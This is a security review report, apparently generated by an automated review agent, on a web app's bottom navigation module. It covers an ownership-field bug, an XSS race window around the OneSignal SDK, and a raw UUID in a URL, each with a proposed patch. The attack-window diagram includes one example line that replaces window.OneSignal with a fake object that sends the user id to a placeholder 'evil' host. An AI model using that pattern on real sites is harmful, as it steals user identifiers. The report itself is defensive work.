# TASKMASTER Security Report

**Date:** 2026-06-06
**Scope:** `apps/VCSM/src/features/shell/modules/bottom-bar/`
**Application Scope:** VCSM
**Reviewer:** TASKMASTER
**Scan Trigger:** THANOS referral + manual (post-THANOS chain)
**Findings Summary:** 0 HIGH | 2 MEDIUM | 1 LOW | 1 INFO
**False Positives Rejected:** 4
**Suggested Patches:** 3

---

## Preflight

```
TASKMASTER PREFLIGHT PASS

Upstream Reports:
- TOXIN:  outputs/2026/06/06/TOXIN/TOXIN_SECURITY_REPORT.md  (0 days — PASS)
- THANOS: outputs/2026/06/06/THANOS/THANOS_REPORT.md         (0 days — PASS)

Scope match: features/shell/modules/bottom-bar — EXACT MATCH

Proceeding with TASKMASTER verification.
```

---

```
TASKMASTER SCAN TARGET

Feature / Route / Engine:  features/shell/modules/bottom-bar
Application Scope:          VCSM
Reason for scan:            Precision verification of TOXIN + THANOS findings; patch advisory
Scan trigger:               THANOS referral
Upstream TOXIN report:      outputs/2026/06/06/TOXIN/TOXIN_SECURITY_REPORT.md
Upstream THANOS report:     outputs/2026/06/06/THANOS/THANOS_REPORT.md

Scan areas loaded:
  Area 1 — Actor Ownership / IDOR
  Area 6 — Auth and Session
  Area 7 — URL and Redirect
```

---

## Executive Summary

TASKMASTER precision scan for `features/shell/modules/bottom-bar` following TOXIN + THANOS chain.

Two MEDIUM findings confirmed with concrete patch paths:

1. **TASK-2026-06-06-001** — `useVportLeadsCount` reads `identity.actorId` (vport, kind:"vport") as `callerActorId` instead of `identity.ownerActorId` (user, kind:"user"). The ownership gate always rejects vport-kind requestors. The leads badge is silently non-functional for all vport owners. One-line fix.

2. **TASK-2026-06-06-002** — OneSignal `_frozenSdk` lazy-freeze pattern has a narrow XSS race window before first `os()` call. Patch: eager-freeze `window.OneSignal` inside the init callback immediately after SDK initialization.

One LOW information-disclosure finding (raw UUID in URL) with a moderate-complexity slug-based fix.

One INFO cross-cutting finding: 14 other hooks across the codebase use the same `identity?.actorId` as `callerActorId` pattern. Several are called in vport persona contexts and may carry the same broken ownership assertion. Scope expansion required.

---

## MEDIUM Findings

---

### TASK-2026-06-06-001

```
SECURITY FINDING

Finding ID:    TASK-2026-06-06-001
Title:         callerActorId reads identity.actorId (vport) — ownership gate always rejects under vport persona
Category:      Actor Ownership / IDOR
Severity:      MEDIUM
Status:        Open
Scope:         VCSM
Location:      hooks/useVportLeadsCount.js:11
```

**Entry Point Map:**
```
ENTRY POINT MAP

Route / API / Controller:  VportLeadsChip (mount) → useVportLeadsCount(actorId)
Input sources:             identity.actorId from useIdentity() — derived from active persona
Trusted input boundary:    identity.adapter → identityContext (session-bound)
Validation at boundary:    PARTIAL — identity is session-bound, but wrong field read
```

**Data Flow Trace:**
```
DATA FLOW TRACE

Source:         identity?.actorId — when vport persona active, this is vportActorId (kind:"vport")
                identity?.ownerActorId — the user actorId (kind:"user"), correctly populated by hydrator
                                          but NOT read by this hook

Intermediate:   callerActorId = identity?.actorId ?? null   ← WRONG FIELD (line 11)

Sink:           countNewVportLeadsController(actorId, callerActorId)   [line 21]
                → assertActorOwnsVportActorController({
                    requestActorId: callerActorId,  ← vportActorId, kind:"vport"
                    targetActorId: actorId           ← same vportActorId
                  })
                → getActorByIdDAL({ actorId: vportActorId }) → kind = "vport"
                → requesterActor.kind !== "user" → throws
                → caught silently → count stays 0 → badge never renders

Defense at sink: PRESENT (assertActorOwnsVportActorController is correct)
                 — but the WRONG INPUT bypasses the intended functionality
```

**Evidence:**
```js
// hooks/useVportLeadsCount.js:11
const callerActorId = identity?.actorId ?? null;
//                             ^^^^^^^^ ← vportActorId when vport active

// features/booking/controller/assertActorOwnsVportActor.controller.js:20-23
const requesterActor = await getActorByIdDAL({ actorId: requestActorId });
if (!requesterActor || requesterActor.is_void === true) {
  throw new Error("Requester actor not found.");
}
if (requesterActor.kind !== "user") {
  throw new Error("Only actor owners can manage this booking resource.");
  // ↑ ALWAYS fires when requestActorId = vportActorId
}

// state/identity/identity.model.js:1-8  — public identity shape
export function toPublicIdentity(source) {
  return {
    actorId: source.actorId,          // vportActorId when vport active
    kind: source.kind,                // "vport"
    ownerActorId: source.ownerActorId ?? null,  // userActorId — CORRECT FIELD
    realmId: source.realmId ?? null,
  }
}

// features/hydration/vcsmActorHydrator.js:57-78 — ownerActorId correctly populated
let ownerActorId = null;
if (ownerRow?.user_id) {
  const ownerActor = await readUserActorByProfileIdDAL(ownerRow.user_id);
  ownerActorId = ownerActor?.id ?? null;
}
// ...
return { ...mapVportActor(actor, vport, realmId), ownerActorId };
```

**Impact:**
- VportLeadsChip badge is silently non-functional for all vport persona owners
- No cross-user data leakage (gate correctly rejects)
- No authorization bypass (gate correctly rejects)
- Feature regression: leads notifications never appear, potential missed business conversions

**Existing Defense:** `assertActorOwnsVportActorController` correctly enforces kind: "user" for requestors. It is working as intended — the bug is in the caller providing the wrong field.

**Why Defense Is Insufficient:** The gate functions correctly but receives the wrong `requestActorId`. The identity model exposes `ownerActorId` for exactly this use case, but the hook reads `actorId` instead.

**Reproduction Steps:**
1. Authenticate as a user who owns a vport
2. Switch to vport persona
3. Open VportLeadsChip — badge count stays at 0 even with pending leads
4. Check browser console — no visible error (silent catch)
5. Verify by switching back to user persona — leads count would work IF identity.ownerActorId were used

**Recommended Fix:** Read `identity.ownerActorId` with fallback to `identity.actorId`

**Suggested Patch (human review only — not auto-applied):**
```js
// hooks/useVportLeadsCount.js — line 11
// BEFORE:
const callerActorId = identity?.actorId ?? null;

// AFTER:
// When vport persona active: ownerActorId = user actorId (kind:"user") → gate passes
// When user persona active:  ownerActorId = null, fallback to actorId = user actorId → gate passes
const callerActorId = identity?.ownerActorId ?? identity?.actorId ?? null;
```

**Additional verification required (DB):** Confirm `ownerActorId` is reliably populated for:
- New vport created in same session (before first full hydration cycle)
- Delegated-access vports (non-primary owners)
- Blocked or deleted vport actors

**Follow-up Commands:** DB (verify ownerActorId population edge cases), SPIDER-MAN (regression test: badge count visible when vport persona active)

---

### TASK-2026-06-06-002

```
SECURITY FINDING

Finding ID:    TASK-2026-06-06-002
Title:         OneSignal _frozenSdk race window — user.id exfiltration under XSS before eager freeze
Category:      Auth and Session
Severity:      MEDIUM
Status:        Open
Scope:         VCSM
Location:      services/onesignal/onesignalClient.js:14–20,
               services/onesignal/initOneSignal.js:31–47
```

**Data Flow Trace:**
```
DATA FLOW TRACE

Source:         window.OneSignal — global mutable reference (attacker-replaceable via XSS)
                user.id — Supabase auth UUID, bound after identity hydration

Validation at boundary: PARTIAL
  - _frozenSdk lazy-freeze protects AFTER first os() call
  - No protection for the window between SDK init and first os() call

Sink:           sdk.login(String(externalId))  ← services/onesignal/onesignalClient.js:65
                where sdk = attacker's fake OneSignal object if race window exploited
                externalId = user.id (Supabase auth UUID)

Defense at sink: PRESENT but PARTIAL — _frozenSdk captures first read of window.OneSignal
```

**Evidence:**
```js
// services/onesignal/onesignalClient.js:14-20
let _frozenSdk = null           // null until first os() call
function os() {
  if (_frozenSdk) return _frozenSdk   // ← protective after first call
  if (typeof window === 'undefined') return null
  const sdk = window.OneSignal ?? null
  if (sdk) _frozenSdk = sdk           // ← race: attacker's fake captured here if XSS fires first
  return sdk
}

// shared/hooks/useOneSignalPush.js:54-57
// Fires AFTER identity hydration (async — DB calls complete first)
useEffect(() => {
  if (user?.id && identity?.actorId) {
    loginOneSignalExternalUser(user.id)   // ← calls os() here — first os() call
  }
}, [user?.id, identity?.actorId])
```

**Attack Window:**
```
[Page load] → [SDK script loads → window.OneSignal = realSDK]
            → [XSS fires] → [window.OneSignal = { login: (id) => fetch('evil/'+id) }]
            → [Identity hydrates] → [loginOneSignalExternalUser(user.id)]
            → [os() → _frozenSdk = attacker's object]
            → [sdk.login(user.id)] → exfiltration
```

**Impact:**
- Exfiltrates `user.id` (Supabase auth UUID — NOT actorId)
- Requires XSS precondition (not a standalone vulnerability)
- `user.id` alone insufficient for Supabase API calls (JWT required separately)
- Enables account enumeration and identity correlation

**Existing Defense:** `_frozenSdk` lazy-freeze protects all calls after the first successful freeze. The window between SDK init and first `loginOneSignalExternalUser` call is the only attack surface.

**Why Defense Is Insufficient:** `_frozenSdk` is populated lazily on first use, not eagerly at init time. The gap between SDK initialization (synchronous) and identity hydration (async — multiple DB calls) is the exploitable window.

**Reproduction Steps (simulation only — no production exploitation):**
1. Intercept page load before identity hydration completes
2. Replace `window.OneSignal` with `{ login: (id) => console.log('captured:', id) }`
3. Observe: when identity hydrates, `loginOneSignalExternalUser(user.id)` logs the captured UUID

**Recommended Fix:** Eagerly freeze `window.OneSignal` inside the `OneSignalDeferred` callback immediately after SDK initialization succeeds.

**Suggested Patch (human review only — not auto-applied):**
```js
// services/onesignal/initOneSignal.js — lines 31–47
// BEFORE:
window.OneSignalDeferred.push(async function (OneSignal) {
  await OneSignal.init({
    appId,
    serviceWorkerPath: 'OneSignalSDKWorker.js',
    serviceWorkerParam: { scope: '/' },
    notifyButton: { enable: false },
    allowLocalhostAsSecureOrigin: true,
  })
})

// AFTER:
window.OneSignalDeferred.push(async function (OneSignal) {
  await OneSignal.init({
    appId,
    serviceWorkerPath: 'OneSignalSDKWorker.js',
    serviceWorkerParam: { scope: '/' },
    notifyButton: { enable: false },
    allowLocalhostAsSecureOrigin: true,
  })

  // Eagerly freeze window.OneSignal post-init to prevent XSS replacement
  // before the onesignalClient lazy-freeze runs on first use.
  try {
    Object.defineProperty(window, 'OneSignal', {
      value: window.OneSignal,
      writable: false,
      configurable: false,
    })
  } catch {
    // Already non-configurable (set by SDK), or SSR — safe to ignore
  }
})
```

**Validation note:** Confirm OneSignal SDK v16 does not attempt to re-assign `window.OneSignal` post-init. If it does, use the alternative approach of exporting a `freezeOneSignalRef()` from `onesignalClient.js` and calling it from the deferred callback.

**Follow-up Commands:** SPIDER-MAN (regression: verify OneSignal login still fires post-freeze), THANOS (re-verify after patch)

---

## Low Findings

---

### TASK-2026-06-06-003

```
SECURITY FINDING

Finding ID:    TASK-2026-06-06-003
Title:         Raw actorId UUID in VportLeadsChip navigation URL — information disclosure
Category:      URL and Redirect
Severity:      LOW
Status:        Open
Scope:         VCSM
Location:      components/VportLeadsChip.jsx:15
```

**Data Flow Trace:**
```
DATA FLOW TRACE

Source:         identity?.actorId — vportActorId UUID (e.g. f47ac10b-58cc-4372-...)
Sink:           leadsPath = `/actor/${actorId}/dashboard/leads`   [line 15]
                → navigate(leadsPath)   [line 23]
                → URL bar, browser history, referrer headers
Defense:        NONE — UUID written directly into URL without slug substitution
```

**Evidence:**
```js
// components/VportLeadsChip.jsx:12–16
const isVport = identity?.kind === "vport";
const actorId = isVport ? identity?.actorId : null;
const count = useVportLeadsCount(actorId);

const leadsPath = actorId ? `/actor/${actorId}/dashboard/leads` : null;
//                                   ^^^^^^^^ raw UUID in navigated URL
const isOnLeadsPage = leadsPath ? pathname.startsWith(leadsPath) : false;
```

**Impact:**
- vport actorId UUID disclosed in browser address bar, history, referrer headers
- No authorization bypass — dashboard route enforces ownership independently
- Enables actor enumeration if combined with other surfaces
- Browser history permanently contains UUID even after session ends

**Existing Defense:** None at URL construction layer. Authorization correctly enforced at dashboard route controller.

**Why Defense Is Insufficient:** Information disclosure is not prevented. Raw UUIDs in URLs violate the platform's "no raw IDs in public URLs" rule (per workspace memory).

**Recommended Fix:** Use the vport's slug from `identity.username` as the path segment, with UUID fallback only if slug is unavailable. Requires confirming the `/vport/:slug/dashboard/leads` route exists or is added.

**Suggested Patch (human review only — not auto-applied):**
```js
// components/VportLeadsChip.jsx — lines 12–16

// BEFORE:
const isVport = identity?.kind === "vport";
const actorId = isVport ? identity?.actorId : null;
const count = useVportLeadsCount(actorId);
const leadsPath = actorId ? `/actor/${actorId}/dashboard/leads` : null;
const isOnLeadsPage = leadsPath ? pathname.startsWith(leadsPath) : false;

// AFTER:
const isVport = identity?.kind === "vport";
const actorId = isVport ? identity?.actorId : null;
const vportSlug = isVport ? (identity?.username ?? null) : null;
const count = useVportLeadsCount(actorId);

// Prefer slug-based path; fall back to UUID path only if slug unavailable
const leadsPath = vportSlug
  ? `/vport/${vportSlug}/dashboard/leads`
  : actorId
    ? `/actor/${actorId}/dashboard/leads`
    : null;
// isOnLeadsPage check works unchanged — pathname.startsWith(leadsPath) still valid
const isOnLeadsPage = leadsPath ? pathname.startsWith(leadsPath) : false;
```

**Router dependency:** Verify `/vport/:slug/dashboard/leads` route exists or add it. If the dashboard currently only matches `/actor/:actorId/*`, a slug-based alias route must be wired before deploying this patch.

**Platform rule reference:** Platform vocabulary contract: raw UUIDs must never appear in public-facing URLs — always use human-readable slugs.

**Follow-up Commands:** Wolverine (router audit for /vport/:slug/dashboard/* route existence)

---

## Info Findings

---

### TASK-2026-06-06-004

```
INFO FINDING

Finding ID:    TASK-2026-06-06-004
Title:         14 hooks across VCSM use identity.actorId as callerActorId — potential systemic
               field mismatch under vport persona (scope expansion required)
Category:      Actor Ownership / IDOR
Severity:      INFO
Status:        Open — requires follow-up audit outside this scope
Scope:         VCSM (codebase-wide — beyond bottom-bar scope)
```

**TASKMASTER grep result:**
```
features/settings/privacy/hooks/useActorPrivacy.js:11
features/settings/vports/hooks/useVportsController.js:98,110
features/settings/vports/hooks/useVportBusinessCardSettings.js:74
features/settings/vports/hooks/useVportDirectoryVisibility.js:24
features/join/hooks/useJoinBarbershop.js:172,242
features/dashboard/vport/dashboard/cards/schedule/hooks/useVportOwnerSchedule.js:27
features/dashboard/vport/dashboard/cards/bookings/hooks/useQuickBookingModal.js:8
features/dashboard/vport/dashboard/cards/bookings/hooks/useVportBookingActions.js:7
features/dashboard/vport/dashboard/cards/team/hooks/useVportTeam.js:13
features/profiles/kinds/vport/screens/content/hooks/useVportContentPages.js:15
features/profiles/kinds/vport/hooks/barbershop/usePublishBarbershopPortfolioPost.js:11
features/profiles/kinds/vport/hooks/barbershop/usePublishBarbershopHoursPost.js:11
```

**Pattern at each site:**
```js
const callerActorId = identity?.actorId ?? null;
// Passed to controller → assertActorOwnsVportActorController
```

**Risk profile by context:**
- `useVportOwnerSchedule` — called while vport persona active. `identity.actorId` = vportActorId. Passes to `loadDayScheduleController`, `updateScheduleBookingStatus`, `rescheduleScheduleBooking`. If these gate on `assertActorOwnsVportActorController`, same silent failure pattern applies.
- `useVportsController` — vport settings context, vport persona likely active.
- `useVportTeam` — vport team management, vport persona active.
- `useVportBookingActions` — booking actions for vport owner, vport persona active.
- Hooks in booking, barbershop publish, content pages — context varies.

**Note:** `useVportOwnerSchedule` also still imports from `identityContext` directly (VEN-BN-005 pattern not yet fixed in that file).

**This finding is outside the bottom-bar module scope.** It is flagged here because it was discovered during the THANOS-recommended scan. Requires a dedicated TASKMASTER run per feature module.

**Follow-up Commands:** TASKMASTER (new run — features/dashboard/vport/dashboard/cards/schedule/), TASKMASTER (new run — features/settings/vports/), TASKMASTER (new run — features/profiles/kinds/vport/), DB (verify ownerActorId field usage patterns against actor_owners RLS)

---

## False Positives Rejected

---

```
FALSE POSITIVE REJECTED

Candidate:       TOXIN-BB-003 — noti:refresh DOM event escalation
Location:        components/BottomNavBar.jsx
Rejection reason: Sink (React Query invalidation) performs only authenticated re-fetch — no
                  data leakage, no privilege escalation. THANOS confirmed EXPLOIT_BLOCKED.
Chain gap:        Impact — no attacker gain beyond polling surge
Notes:           None — BLOCKED classification correct
```

```
FALSE POSITIVE REJECTED

Candidate:       TOXIN-BB-004 — actor-switch stale profileIdRef race
Location:        hooks/useVportLeadsCount.js
Rejection reason: profileIdRef.current is never populated because refresh() always fails at
                  assertActorOwnsVportActorController before reaching the assignment.
                  Stale ref attack is inert. Root cause is TASK-2026-06-06-001.
Chain gap:        Source — the stale race cannot manifest because profileIdRef stays null
Notes:           Finding superseded by TASK-2026-06-06-001
```

```
FALSE POSITIVE REJECTED

Candidate:       TOXIN-BB-ARCH-001 — profiles controller direct import
Location:        components/BottomNavBar.jsx
Rejection reason: getCachedActorCanonicalSlug() reads a public SEO view. No auth escalation
                  possible. No sensitive data in cache. THANOS confirmed FALSE_POSITIVE.
Chain gap:        Impact — no attacker gain from slug cache access
Notes:           Architecture violation is real (CONTRACT-CRIT-001) but not a security finding.
                 Route to Wolverine for adapter boundary fix.
```

```
FALSE POSITIVE REJECTED

Candidate:       TOXIN-BB-ARCH-002 — dashboard controller direct import
Location:        hooks/useVportLeadsCount.js
Rejection reason: assertActorOwnsVportActorController is enforced at controller layer regardless
                  of call site. Adapter would be a pass-through re-export. No auth skip possible.
                  THANOS confirmed FALSE_POSITIVE.
Chain gap:        Trust Boundary — boundary violation is architectural; no security gate bypassed
Notes:           Architecture violation remains open. Route to Wolverine for adapter fix.
```

---

## Suggested Patch Queue

```
SUGGESTED PATCH QUEUE

| # | Finding ID           | Title                                           | Severity | Layer to Patch | Patch Complexity | Requires DB Change |
|---|----------------------|-------------------------------------------------|----------|----------------|------------------|--------------------|
| 1 | TASK-2026-06-06-001  | callerActorId: identity.ownerActorId fallback   | MEDIUM   | Hook           | SIMPLE           | NO (verify only)   |
| 2 | TASK-2026-06-06-002  | OneSignal eager freeze post-init                | MEDIUM   | Service        | SIMPLE           | NO                 |
| 3 | TASK-2026-06-06-003  | VportLeadsChip slug-based navigation path       | LOW      | Component      | MODERATE         | NO (router check)  |
```

---

## Required Follow-up Commands

| Command | Reason | Priority |
|---|---|---|
| DB | Verify `ownerActorId` population for: new vport same-session, delegated access, blocked vport | P1 |
| SPIDER-MAN | Regression: leads badge visible when vport persona active; OneSignal post-freeze | P1 |
| Wolverine | Router audit — `/vport/:slug/dashboard/leads` route existence or addition | P2 |
| TASKMASTER | New run: `features/dashboard/vport/dashboard/cards/schedule/` — same callerActorId pattern | P2 |
| TASKMASTER | New run: `features/settings/vports/` — same callerActorId pattern under vport persona | P2 |
| TASKMASTER | New run: `features/profiles/kinds/vport/` — barbershop publish hooks same pattern | P3 |
| THANOS | Re-verify TASK-2026-06-06-001 and TASK-2026-06-06-002 after patches applied | P1 |
| THOR | Release gate — no current HIGH blockers; MEDIUM patches P1 before gate | — |

---

## THOR Release Gate Assessment

| Condition | Status |
|---|---|
| Any HIGH finding open | NO — 0 HIGH findings |
| Any secrets exposure | NO |
| Any IDOR with confirmed exploit path | NO — TASK-2026-06-06-001 is functional bug, not IDOR |
| Any RLS gap affecting actor-scoped write paths | NO — reads only |
| MEDIUM findings with patch in progress | YES — TASK-2026-06-06-001 (P1), TASK-2026-06-06-002 (P1) |

**THOR Release Blocker:** NO from this module.
**Recommendation:** CAUTION — apply P1 patches and run SPIDER-MAN regression before THOR gate evaluation.

---

## TASKMASTER Verdict

**CAUTION**

Two MEDIUM findings with simple patch paths. No HIGH findings. No auth bypass confirmed. No release blocker from this module alone. P1 priority: fix `callerActorId` field (one line), freeze OneSignal ref (four lines). Both patches are low-risk and self-contained. Follow-up TASKMASTER runs recommended for 12 related hooks across dashboard, settings, and profiles modules.

TASKMASTER does not emit THOR_RELEASE_ELIGIBLE. Release authority belongs exclusively to THOR.
